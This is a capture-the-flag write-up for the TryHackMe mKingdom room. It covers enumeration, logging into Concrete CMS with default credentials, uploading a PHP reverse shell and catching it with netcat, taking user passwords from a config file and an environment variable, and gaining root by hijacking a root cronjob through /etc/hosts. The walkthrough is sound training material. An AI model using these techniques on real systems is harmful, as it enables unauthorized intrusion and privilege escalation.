---
title: 'TryHackMe: mKingdom'
author: batu7x
categories: [TryHackMe CTFs]
tags: [web, gobuster, cms, rce, env, pspy, crontab]
render_with_liquid: false
media_subpath: /images/tryhackme_mKingdom
image:
  path: room.webp
---

![mKingdom](room1.webp){: width="600" height="150" .shadow }
_<https://tryhackme.com/room/mkingdom>_

## Enumeration

### Nmap Scan

Lets start our CTF with enumeration, we will use nmap scan firstly.

```console
$ sudo nmap -Pn -sC -sV -vv -p- 10.10.35.45

Nmap scan report for 10.10.35.45
Host is up, received user-set (0.066s latency).
Scanned at 2025-05-19 13:26:17 +03 for 52s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
85/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: 0H N0! PWN3D 4G4IN
```

Only port `85` is open, its http port. Lets check the website.

### Gobuster

Firstly lets check the website, there is nothing on the index page & source code. We will try bruteforcing directories with `gobuster` tool.

```console
$ gobuster dir -u http://10.10.35.45:85 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Starting gobuster in directory enumeration mode
===============================================================
/app                  (Status: 301) [Size: 310] [--> http://10.10.35.45:85/app/]
```

Gobuster finds /app directory lets check this directory.

![room](room2.webp){: width="1200" height="600" }

## Shell

### www-data Shell

There is an button on the page named `JUMP` if we click on it, it redirects us to /app/castle

There is a blog build with help of Concrete CMS. If we check the version of Concrete CMS in Wappalyzer Add-on. We see its 8.5.2

![room1](room3.webp){: width="1200" height="600" }

I searched for vulnerabilities in this version 8.5.2

It have a RCE vulnerability but we need to get access to admin account. There is a login button bottom of the index page. Before we start bruteforce i tried username and passwords like admin:admin , admin:password and admin:password worked. We are in!

Now we need to add php to `Allow File Types` page.

![room2](room4.webp){: width="1200" height="600" }

We need to create a php reverse shell. We can use pentestmonkey's php reverse shell (on github). Dont forget to change your IP & Port in file.

Now move to the `File Manager` page and upload the reverse shell. It gives us the URL where the file located.

![room3](room5.webp){: width="1200" height="600" }

```console
$ rlwrap nc -lvnp 9001

connect to [10.23.66.67] from (UNKNOWN) [10.10.35.45] 40098
Linux mkingdom.thm 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 07:01:08 up 39 min,  0 users,  load average: 0.09, 0.07, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data),1003(web)
```

We got our shell as www-data. Now we need move to other user (toad or mario)

### Toad Shell

We can learn toad's password from /var/www/html/app/castle/application/config/database.php

![room4](room6.webp){: width="1200" height="600" }

Change our user to toad.

```console
$ su toad
```

### Mario Shell

In environmental variables of toad there is something named PWD_token

![room5](room7.webp){: width="1200" height="600" }

If we decode it with base64. We are getting mario's password!

![room6](room8.webp){: width="1200" height="600" }

Now change our user to mario

```console
$ su mario
```

We can't get user.txt in mario's home directory for now because it owned by root

### Root Shell

There is a tool named `pspy`. This tool allows us to see linux processes in real time without being root.

If we run the pspy and wait for a few minutes, we will see there is a cronjob running as root in every minute.

“counter.sh” file gets pulled from mkingdom.thm, and executed with bash every minute. We need to edit counter.sh or edit /etc/hosts.

We can edit /etc/hosts and we will add our attacker ip with mkingdom.thm url.

```console
$
$ATTACKERIP mkingdom.thm

```

Now on our attacker machine create exact directory

```console
$ sudo mkdir -p /app/castle/application
```

Create `counter.sh` in this directory & put reverse shell on it. Start hosting http server on port 85 with python3

```console
$ python3 -m http.server 85
```

And after about a minute we see a GET request being made, grabbing our counter.sh & We got **root** shell.

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>